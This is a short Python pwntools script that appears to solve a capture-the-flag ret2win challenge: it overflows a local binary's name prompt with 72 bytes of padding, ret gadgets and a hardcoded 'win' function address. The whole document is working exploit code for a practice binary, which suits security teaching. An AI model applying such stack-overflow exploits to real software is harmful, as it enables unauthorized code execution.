from pwn import *

p = process("./pwn")

ret = p64(0x401016)
win_addr = p64(0x401146)

payload = b"A" * 72 + ret + ret + ret + win_addr

p.sendlineafter(b"name: ", payload)
print(p.recvall())
